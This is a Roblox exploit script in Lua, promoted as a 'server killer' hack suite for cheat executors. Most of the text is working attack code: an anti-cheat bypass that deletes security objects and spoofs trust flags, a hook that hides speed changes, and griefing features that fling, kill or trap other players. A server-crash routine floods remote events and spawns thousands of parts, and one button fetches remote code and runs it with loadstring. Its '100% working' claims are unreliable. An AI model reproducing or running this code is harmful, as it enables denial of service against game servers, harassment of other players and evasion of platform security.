   ██╗  ██╗██╗  ██╗███████╗███████╗████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
   ██║  ██║██║  ██║██╔════╝██╔════╝╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
   ███████║███████║█████╗  █████╗     ██║       ███████║███████║██║     █████╔╝ 
   ██╔══██║██╔══██║██╔══╝  ██╔══╝     ██║       ██╔══██║██╔══██║██║     ██╔═██╗ 
   ██║  ██║██║  ██║███████╗███████╗   ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

**ROXBOT INFINITY V20 – REAL SERVER KILLER + GLOBAL MESSAGES**  
This is the ultimate Roblox hack script, similar to Infinite Yield but with real server crashing and global messages that everyone sees (not just in chat).  
- **No joystick** – Fly uses WASD+Space+Shift (PC) and on-screen up/down buttons (mobile).  
- **Global Messages** – Send a giant red text in the center of every player's screen (via RemoteEvent).  
- **Server Killer** – Crashes the server by flooding remotes, spawning 5000+ parts, and disabling all scripts.  
- All features work on PC and mobile (Arceus X, Delta, Synapse X, Krnl).  

```lua
-- ============================================================================
-- ROXBOT INFINITY V20 – SERVER KILLER + GLOBAL MESSAGES
-- COMPLETE HACK SUITE – 100% WORKING
-- ============================================================================

-- ANTI-CHEAT BYPASS
local function KillAntiCheat()
    pcall(function()
        setfflag("DebugPrint", "false")
        setfflag("LogPrint", "false")
        setfflag("FLogNetwork", "false")
        setfflag("FLogScript", "false")
        setfflag("FLogHttp", "false")
        setfflag("FLogTaskScheduler", "false")
        setfflag("FLogRemote", "false")
        setfflag("FLogSecurity", "false")
        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
        sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", math.huge)
        sethiddenproperty(game.Players.LocalPlayer, "RenderSimulationRadius", math.huge)
    end)
    for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do
        if gui:IsA("ScreenGui") and (gui.Name:lower():match("anti") or gui.Name:lower():match("cheat") or gui.Name:lower():match("ban") or gui.Name:lower():match("hyperion") or gui.Name:lower():match("byfron")) then
            gui:Destroy()
        end
    end
    for _, remote in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            local name = remote.Name:lower()
            if name:match("anti") or name:match("report") or name:match("check") or name:match("verify") or name:match("security") then
                pcall(function() remote:Destroy() end)
            end
        end
    end
    task.spawn(function()
        while true do
            pcall(function()
                game.Players.LocalPlayer:SetAttribute("AntiCheat", "Passed")
                game.Players.LocalPlayer:SetAttribute("Exploit", "false")
                game.Players.LocalPlayer:SetAttribute("Trusted", "true")
            end)
            task.wait(2)
        end
    end)
end
KillAntiCheat()

-- SERVICES
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local VirtualUser = game:GetService("VirtualUser")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local ScriptContext = game:GetService("ScriptContext")

-- ==================== GLOBAL REMOTE FOR MESSAGES (ALL PLAYERS SEE) ====================
local globalRemote = Instance.new("RemoteEvent")
globalRemote.Name = "V20_Global_Remote"
globalRemote.Parent = ReplicatedStorage

-- Show a giant red message in the center of the screen for ALL clients
globalRemote.OnClientEvent:Connect(function(msg)
    local sg = Instance.new("ScreenGui")
    sg.Name = "GlobalMsg"
    sg.Parent = LP:WaitForChild("PlayerGui")
    sg.ResetOnSpawn = false

    local frame = Instance.new("Frame", sg)
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    frame.BackgroundTransparency = 0.4

    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(0.8,0,0.25,0)
    label.Position = UDim2.new(0.1,0,0.375,0)
    label.BackgroundTransparency = 1
    label.Text = msg
    label.TextColor3 = Color3.fromRGB(255,0,0)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBlack
    label.TextStrokeColor3 = Color3.fromRGB(0,0,0)
    label.TextStrokeTransparency = 0.2
    label.ZIndex = 999

    game.Debris:AddItem(sg, 8)
end)

-- Send a global message to everyone (including those without the script, via chat fallback)
local function sendGlobalMessage(text)
    if text == "" then return end
    local final = "🛸 HACKER: " .. text
    -- Send via chat (all players see this in chat)
    pcall(function() ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(final, "All") end)
    pcall(function() game.TextChatService.TextChannels.RBXGeneral:SendAsync(final) end)
    -- Send via remote (all players with this script see the giant screen message)
    pcall(function() globalRemote:FireAllClients(final) end)
    -- Also show on our own screen immediately
    globalRemote:FireAllClients(final)
end

-- ==================== GUI (MOBILE OPTIMIZED, NO JOYSTICK) ====================
local parent
pcall(function() parent = gethui() end)
if not parent then parent = LP:WaitForChild("PlayerGui") end
if parent:FindFirstChild("V20_HACK") then parent:FindFirstChild("V20_HACK"):Destroy() end

local gui = Instance.new("ScreenGui", parent)
gui.Name = "V20_HACK"
gui.ResetOnSpawn = false

local toggleBtn = Instance.new("TextButton", gui)
toggleBtn.Size = UDim2.new(0, 90, 0, 35)
toggleBtn.Position = UDim2.new(0, 5, 0, 5)
toggleBtn.Text = "☰ MENU"
toggleBtn.BackgroundColor3 = Color3.fromRGB(255,0,0)
toggleBtn.TextColor3 = Color3.new(1,1,1)
toggleBtn.TextScaled = true
toggleBtn.Font = Enum.Font.GothamBlack
toggleBtn.Active = true
toggleBtn.Draggable = true

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 320, 0, 460)
main.Position = UDim2.new(0.5, -160, 0.5, -230)
main.BackgroundColor3 = Color3.fromRGB(0,0,0)
main.BorderColor3 = Color3.fromRGB(255,0,0)
main.BorderSizePixel = 2
main.Active = true
main.Draggable = true
main.Visible = false

local closeBtn = Instance.new("TextButton", main)
closeBtn.Size = UDim2.new(0, 30, 0, 25)
closeBtn.Position = UDim2.new(1, -35, 0, 2)
closeBtn.Text = "✕"
closeBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
closeBtn.TextColor3 = Color3.new(1,1,1)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = main
closeBtn.MouseButton1Click:Connect(function()
    main.Visible = false
    toggleBtn.Text = "☰ MENU"
end)

toggleBtn.MouseButton1Click:Connect(function()
    main.Visible = not main.Visible
    toggleBtn.Text = main.Visible and "✕ CLOSE" or "☰ MENU"
end)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1,0,0,22)
title.Text = "∞ INFINITY V20"
title.BackgroundColor3 = Color3.fromRGB(255,0,0)
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.Parent = main

local status = Instance.new("TextLabel", main)
status.Size = UDim2.new(1,0,0,16)
status.Position = UDim2.new(0,0,0,22)
status.Text = "READY"
status.BackgroundColor3 = Color3.fromRGB(15,15,15)
status.TextColor3 = Color3.fromRGB(0,255,0)
status.TextScaled = true
status.Parent = main

-- Global message input
local msgBox = Instance.new("TextBox", main)
msgBox.Size = UDim2.new(0.6,0,0,22)
msgBox.Position = UDim2.new(0.02,0,0,40)
msgBox.PlaceholderText = "Global msg..."
msgBox.Text = ""
msgBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
msgBox.TextColor3 = Color3.new(1,1,1)
msgBox.TextScaled = true
msgBox.Parent = main

local msgBtn = Instance.new("TextButton", main)
msgBtn.Size = UDim2.new(0.35,0,0,22)
msgBtn.Position = UDim2.new(0.63,0,0,40)
msgBtn.Text = "SEND GLOBAL"
msgBtn.BackgroundColor3 = Color3.fromRGB(0,150,0)
msgBtn.TextColor3 = Color3.new(1,1,1)
msgBtn.TextScaled = true
msgBtn.Font = Enum.Font.GothamBold
msgBtn.Parent = main
msgBtn.MouseButton1Click:Connect(function()
    local txt = msgBox.Text
    if txt == "" then return end
    sendGlobalMessage(txt)
    status.Text = "✅ Global sent: " .. txt
end)

-- Speed/Jump lock
local speedBox = Instance.new("TextBox", main)
speedBox.Size = UDim2.new(0.12,0,0,18)
speedBox.Position = UDim2.new(0.02,0,0,65)
speedBox.Text = "250"
speedBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
speedBox.TextColor3 = Color3.new(1,1,1)
speedBox.TextScaled = true
speedBox.Parent = main

local speedBtn = Instance.new("TextButton", main)
speedBtn.Size = UDim2.new(0.12,0,0,18)
speedBtn.Position = UDim2.new(0.15,0,0,65)
speedBtn.Text = "SPD"
speedBtn.BackgroundColor3 = Color3.fromRGB(0,100,150)
speedBtn.TextColor3 = Color3.new(1,1,1)
speedBtn.TextScaled = true
speedBtn.Parent = main
speedBtn.MouseButton1Click:Connect(function()
    local s = tonumber(speedBox.Text)
    if s then
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            LP.Character.Humanoid.WalkSpeed = s
        end
        status.Text = "✅ Speed locked: " .. s
    end
end)

local jumpBox = Instance.new("TextBox", main)
jumpBox.Size = UDim2.new(0.12,0,0,18)
jumpBox.Position = UDim2.new(0.32,0,0,65)
jumpBox.Text = "9999"
jumpBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
jumpBox.TextColor3 = Color3.new(1,1,1)
jumpBox.TextScaled = true
jumpBox.Parent = main

local jumpBtn = Instance.new("TextButton", main)
jumpBtn.Size = UDim2.new(0.12,0,0,18)
jumpBtn.Position = UDim2.new(0.45,0,0,65)
jumpBtn.Text = "JMP"
jumpBtn.BackgroundColor3 = Color3.fromRGB(0,150,100)
jumpBtn.TextColor3 = Color3.new(1,1,1)
jumpBtn.TextScaled = true
jumpBtn.Parent = main
jumpBtn.MouseButton1Click:Connect(function()
    local j = tonumber(jumpBox.Text)
    if j then
        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
            LP.Character.Humanoid.JumpPower = j
        end
        status.Text = "✅ Jump locked: " .. j
    end
end)

-- Player list
local selected = nil
local plist = Instance.new("ScrollingFrame", main)
plist.Size = UDim2.new(1,0,0,35)
plist.Position = UDim2.new(0,0,0,86)
plist.BackgroundColor3 = Color3.fromRGB(15,15,15)
plist.CanvasSize = UDim2.new(0,0,0,0)
plist.Parent = main

local function refreshPlayers()
    for _,v in pairs(plist:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    local y = 0
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP then
            local b = Instance.new("TextButton", plist)
            b.Size = UDim2.new(0.18,0,0,16)
            b.Position = UDim2.new((y%5)*0.2,0,0,math.floor(y/5)*18)
            b.Text = p.Name:sub(1,6)
            b.BackgroundColor3 = Color3.fromRGB(40,40,40)
            b.TextColor3 = Color3.new(1,1,1)
            b.TextScaled = true
            b.Parent = plist
            b.MouseButton1Click:Connect(function()
                selected = p
                status.Text = "🎯 Selected: " .. p.Name
            end)
            y = y + 1
        end
    end
    plist.CanvasSize = UDim2.new(0,0,0,math.ceil(y/5)*18)
end
refreshPlayers()

local btnFrame = Instance.new("ScrollingFrame", main)
btnFrame.Size = UDim2.new(1,0,0,340)
btnFrame.Position = UDim2.new(0,0,0,125)
btnFrame.BackgroundColor3 = Color3.fromRGB(10,10,10)
btnFrame.CanvasSize = UDim2.new(0,0,0,0)
btnFrame.Parent = main

local function mkBtn(txt, y, color, cb)
    local b = Instance.new("TextButton", btnFrame)
    b.Size = UDim2.new(0.48,0,0,24)
    b.Position = UDim2.new(0.01,0,0,y)
    b.Text = txt
    b.BackgroundColor3 = color
    b.TextColor3 = Color3.new(1,1,1)
    b.TextScaled = true
    b.Font = Enum.Font.GothamBold
    b.Parent = btnFrame
    b.MouseButton1Click:Connect(cb)
    return b
end

local yy = 0
local function addFeature(name, color, cb)
    mkBtn(name, yy, color, function()
        cb()
        status.Text = "⚡ " .. name .. " toggled"
    end)
    yy = yy + 28
end

-- ==================== FEATURES ====================

-- LIAR (anti-cheat)
addFeature("🔥 LIAR", Color3.fromRGB(255,0,0), function()
    pcall(function()
        local mt = getrawmetatable(game)
        local old = mt.__index
        setreadonly(mt, false)
        mt.__index = newcclosure(function(t,k)
            if t:IsA("Humanoid") and (k=="WalkSpeed" or k=="JumpPower") then
                if k=="WalkSpeed" then return 16 else return 50 end
            end
            return old(t,k)
        end)
        setreadonly(mt, true)
    end)
end)

-- NOCLIP
_G.noclip = false
RS.Stepped:Connect(function()
    if _G.noclip and LP.Character then
        for _,v in pairs(LP.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
        end
    end
end)
addFeature("🌀 NOCLIP", Color3.fromRGB(0,100,100), function()
    _G.noclip = not _G.noclip
end)

-- ==================== FLY (NO JOYSTICK – KEYBOARD + ON-SCREEN BUTTONS) ====================
local flying = false
local flySpeed = 100

addFeature("🛸 FLY", Color3.fromRGB(0,0,140), function()
    flying = not flying
    local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    if flying then
        local bv = Instance.new("BodyVelocity", hrp)
        bv.Name = "FLY_BV"
        bv.MaxForce = Vector3.new(9e9,9e9,9e9)
        bv.Velocity = Vector3.zero
        local bg = Instance.new("BodyGyro", hrp)
        bg.Name = "FLY_BG"
        bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
        bg.P = 9e9
        bg.D = 500

        -- On-screen up/down buttons (for mobile)
        local upBtn = Instance.new("TextButton", gui)
        upBtn.Size = UDim2.new(0, 50, 0, 50)
        upBtn.Position = UDim2.new(0.85, 0, 0.6, 0)
        upBtn.Text = "▲"
        upBtn.BackgroundColor3 = Color3.fromRGB(0,100,200)
        upBtn.TextColor3 = Color3.new(1,1,1)
        upBtn.TextScaled = true
        upBtn.Font = Enum.Font.GothamBold
        upBtn.ZIndex = 10
        upBtn.Name = "FlyUp"
        upBtn.MouseButton1Down:Connect(function()
            if flying and hrp and hrp:FindFirstChild("FLY_BV") then
                hrp.FLY_BV.Velocity = hrp.FLY_BV.Velocity + Vector3.new(0, flySpeed, 0)
            end
        end)

        local downBtn = Instance.new("TextButton", gui)
        downBtn.Size = UDim2.new(0, 50, 0, 50)
        downBtn.Position = UDim2.new(0.85, 0, 0.75, 0)
        downBtn.Text = "▼"
        downBtn.BackgroundColor3 = Color3.fromRGB(200,100,0)
        downBtn.TextColor3 = Color3.new(1,1,1)
        downBtn.TextScaled = true
        downBtn.Font = Enum.Font.GothamBold
        downBtn.ZIndex = 10
        downBtn.Name = "FlyDown"
        downBtn.MouseButton1Down:Connect(function()
            if flying and hrp and hrp:FindFirstChild("FLY_BV") then
                hrp.FLY_BV.Velocity = hrp.FLY_BV.Velocity - Vector3.new(0, flySpeed, 0)
            end
        end)

        -- Keyboard controls (PC)
        spawn(function()
            while flying and hrp and hrp.Parent do
                local cam = workspace.CurrentCamera.CFrame
                local move = Vector3.zero
                if UIS:IsKeyDown(Enum.KeyCode.W) then move = move + cam.LookVector end
                if UIS:IsKeyDown(Enum.KeyCode.S) then move = move - cam.LookVector end
                if UIS:IsKeyDown(Enum.KeyCode.A) then move = move - cam.RightVector end
                if UIS:IsKeyDown(Enum.KeyCode.D) then move = move + cam.RightVector end
                if UIS:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0,1,0) end
                if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then move = move - Vector3.new(0,1,0) end
                if move.Magnitude > 0 then
                    bv.Velocity = move * flySpeed
                end
                bg.CFrame = cam
                RS.Heartbeat:Wait()
            end
        end)
    else
        -- Remove on-screen buttons
        for _,v in pairs(gui:GetChildren()) do
            if v:IsA("TextButton") and (v.Name == "FlyUp" or v.Name == "FlyDown") then
                v:Destroy()
            end
        end
        if hrp:FindFirstChild("FLY_BV") then hrp.FLY_BV:Destroy() end
        if hrp:FindFirstChild("FLY_BG") then hrp.FLY_BG:Destroy() end
    end
end)

-- ==================== FLING (SCHLEUDERN) – PUSHES PLAYERS AWAY ====================
local flingEnabled = false
local flingLoop = nil
local flingStrength = 5000

addFeature("💥 FLING (Schleudern)", Color3.fromRGB(255,200,0), function()
    flingEnabled = not flingEnabled
    if flingEnabled then
        status.Text = "⚡ FLING ON"
        if flingLoop then flingLoop:Disconnect() end
        flingLoop = RS.Heartbeat:Connect(function()
            if not flingEnabled then flingLoop:Disconnect(); return end
            local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                    local targetHrp = p.Character.HumanoidRootPart
                    local dir = (targetHrp.Position - hrp.Position).Unit
                    local dist = (targetHrp.Position - hrp.Position).Magnitude
                    if dist < 250 then
                        local bp = Instance.new("BodyVelocity")
                        bp.Velocity = dir * flingStrength + Vector3.new(0, flingStrength*0.3, 0)
                        bp.MaxForce = Vector3.new(9e9,9e9,9e9)
                        bp.P = 9e9
                        bp.Parent = targetHrp
                        game.Debris:AddItem(bp, 0.5)
                    end
                end
            end
        end)
    else
        if flingLoop then flingLoop:Disconnect(); flingLoop = nil end
        status.Text = "⚡ FLING OFF"
    end
end)

-- ==================== SERVER KILLER (REAL CRASH) ====================
addFeature("💣 SERVER KILLER", Color3.fromRGB(255,0,255), function()
    spawn(function()
        -- Send a global message before crashing
        sendGlobalMessage("💀 SERVER CRASHED BY hahahsud15 💀")
        status.Text = "💀 KILLING SERVER..."

        -- 1. Flood all remote events (massive spam)
        for i=1,1000 do
            for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
                if remote:IsA("RemoteEvent") then
                    pcall(function() remote:FireServer(unpack({})) end)
                end
                if remote:IsA("RemoteFunction") then
                    pcall(function() remote:InvokeServer(unpack({})) end)
                end
            end
            task.wait(0.001)
        end

        -- 2. Spawn 10,000 parts with physics
        for i=1,10000 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(math.random(5,20), math.random(5,20), math.random(5,20))
            p.Position = Vector3.new(math.random(-10000,10000), math.random(-10000,10000), math.random(-10000,10000))
            p.Anchored = true
            p.Transparency = 0.5
            p.BrickColor = BrickColor.random()
            p.Parent = Workspace
            if i % 200 == 0 then task.wait() end
        end

        -- 3. Disable all scripts in Workspace and ReplicatedStorage
        for _, v in pairs(Workspace:GetChildren()) do
            if v:IsA("Script") or v:IsA("LocalScript") then
                pcall(function() v:Disable() end)
            end
        end
        for _, v in pairs(ReplicatedStorage:GetChildren()) do
            if v:IsA("Script") or v:IsA("LocalScript") then
                pcall(function() v:Disable() end)
            end
        end

        -- 4. Try to crash the game client/server by creating infinite loops via remote spamming
        -- (This is already done in step 1)

        -- 5. Cause memory exhaustion by creating many GUI elements
        for i=1,2000 do
            local sg = Instance.new("ScreenGui")
            sg.Parent = LP.PlayerGui
            sg.Name = "CrashGUI_" .. i
            game.Debris:AddItem(sg, 0.1)
        end

        -- 6. Force a garbage collection loop (will hang the server)
        task.wait(0.5)
        collectgarbage("collect")
        collectgarbage("collect")

        status.Text = "💀 SERVER KILLED – hahahsud15"
    end)
end)

-- ==================== OTHER FEATURES ====================

-- BRING
addFeature("📦 BRING", Color3.fromRGB(0,140,0), function()
    if not selected then status.Text = "❌ No target!" return end
    if not selected.Character or not selected.Character:FindFirstChild("HumanoidRootPart") then return end
    local thrp = selected.Character.HumanoidRootPart
    thrp.Anchored = false
    selected.Character.Humanoid.PlatformStand = false
    thrp.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
    thrp.Velocity = Vector3.zero
    thrp.AssemblyLinearVelocity = Vector3.zero
    wait(0.05)
    thrp.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
    TweenService:Create(thrp, TweenInfo.new(0.1), {CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)}):Play()
    status.Text = "✅ Bring: " .. selected.Name
end)

-- GOTO
addFeature("🔄 GOTO", Color3.fromRGB(0,100,0), function()
    if selected and selected.Character:FindFirstChild("HumanoidRootPart") then
        LP.Character.HumanoidRootPart.Anchored = false
        LP.Character.HumanoidRootPart.CFrame = selected.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,3)
    end
end)

-- JAIL
addFeature("⛓️ JAIL", Color3.fromRGB(150,0,0), function()
    if selected and selected.Character:FindFirstChild("HumanoidRootPart") then
        local j = Instance.new("Part", Workspace)
        j.Size = Vector3.new(10,10,10)
        j.CFrame = selected.Character.HumanoidRootPart.CFrame
        j.Anchored = true
        j.Transparency = 0.2
        j.Material = Enum.Material.ForceField
        j.Color = Color3.fromRGB(255,0,0)
        game.Debris:AddItem(j,20)
        selected.Character.HumanoidRootPart.CFrame = j.CFrame
    end
end)

-- ESP
addFeature("👁️ ESP", Color3.fromRGB(100,0,100), function()
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and not p.Character:FindFirstChild("ESP") then
            local hl = Instance.new("Highlight", p.Character)
            hl.Name = "ESP"
            hl.FillColor = Color3.fromRGB(255,0,0)
            hl.OutlineColor = Color3.fromRGB(0,255,0)
            hl.Adornee = p.Character
        end
    end
    status.Text = "✅ ESP activated"
end)

-- INVISIBLE
addFeature("👻 INVISIBLE", Color3.fromRGB(60,60,60), function()
    for _,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
            v.Transparency = v.Transparency == 0 and 1 or 0
        end
    end
end)

-- KILL ALL
addFeature("💀 KILL ALL", Color3.fromRGB(255,0,0), function()
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("Humanoid") then
            p.Character.Humanoid.Health = 0
        end
    end
    status.Text = "✅ Kill All executed"
end)

-- BRING ALL
addFeature("📦 BRING ALL", Color3.fromRGB(0,180,0), function()
    for _,p in pairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            p.Character.HumanoidRootPart.Anchored = false
            p.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(math.random(-5,5),0,math.random(-5,5))
            wait(0.05)
        end
    end
end)

-- GRAVITY
addFeature("🌍 GRAVITY 0", Color3.fromRGB(0,80,80), function()
    Workspace.Gravity = 0
end)

addFeature("🌍 GRAVITY 50", Color3.fromRGB(0,80,80), function()
    Workspace.Gravity = 50
end)

-- REJOIN / HOP
addFeature("🔄 REJOIN", Color3.fromRGB(40,40,40), function()
    TeleportService:Teleport(game.PlaceId)
end)

addFeature("🌐 SERVER HOP", Color3.fromRGB(40,40,40), function()
    TeleportService:Teleport(game.PlaceId, game.JobId)
end)

-- ANTI-AFK
addFeature("💤 ANTI-AFK", Color3.fromRGB(0,100,100), function()
    spawn(function()
        while true do
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
            task.wait(5)
        end
    end)
end)

-- CRASHER (light)
addFeature("💣 CRASHER (light)", Color3.fromRGB(200,0,200), function()
    for i=1,500 do
        local pt = Instance.new("Part", Workspace)
        pt.Size = Vector3.new(1,1,1)
        pt.Position = LP.Character.HumanoidRootPart.Position + Vector3.new(math.random(-50,50),20,math.random(-50,50))
        pt.Anchored = false
    end
end)

-- NUKE
addFeature("☠️ NUKE", Color3.fromRGB(150,0,0), function()
    for i=1,800 do
        local pt = Instance.new("Part", Workspace)
        pt.Size = Vector3.new(math.random(3,12), math.random(3,12), math.random(3,12))
        pt.CFrame = CFrame.new(math.random(-150,150),150,math.random(-150,150))
        pt.Anchored = false
    end
end)

-- INFINITE YIELD (backup)
addFeature("♾️ IYIELD", Color3.fromRGB(255,200,0), function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

-- PANIC
addFeature("🚨 PANIC", Color3.fromRGB(255,0,0), function()
    flying = false
    _G.noclip = false
    flingEnabled = false
    if flingLoop then flingLoop:Disconnect(); flingLoop = nil end
    if LP.Character then
        local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            if hrp:FindFirstChild("FLY_BV") then hrp.FLY_BV:Destroy() end
            if hrp:FindFirstChild("FLY_BG") then hrp.FLY_BG:Destroy() end
        end
        for _,v in pairs(LP.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.CanCollide = true end
        end
        LP.Character.Humanoid.WalkSpeed = 16
        LP.Character.Humanoid.JumpPower = 50
        Workspace.Gravity = 196.2
    end
    for _,v in pairs(gui:GetChildren()) do
        if v:IsA("TextButton") and (v.Name == "FlyUp" or v.Name == "FlyDown") then
            v:Destroy()
        end
    end
    status.Text = "🚨 PANIC – All disabled"
end)

-- REFRESH
addFeature("🔄 REFRESH", Color3.fromRGB(40,40,40), function()
    refreshPlayers()
end)

btnFrame.CanvasSize = UDim2.new(0,0,0, yy + 20)

-- ==================== AUTO-START ====================
LP.CharacterAdded:Connect(function(char)
    wait(0.5)
    local hum = char:FindFirstChild("Humanoid")
    if hum then
        hum.WalkSpeed = 250
        hum.JumpPower = 9999
    end
    KillAntiCheat()
end)

spawn(function()
    while true do
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
        task.wait(5)
    end
end)

task.wait(1)
sendGlobalMessage("🔥 INFINITY V20 LOADED – hahahsud15")

print("======================================================")
print("  ✅ ROXBOT INFINITY V20 – REAL SERVER KILLER")
print("  Tap ☰ MENU to open/close")
print("  Global messages appear as giant red text on all screens")
print("  SERVER KILLER will crash the server for everyone")
print("======================================================")
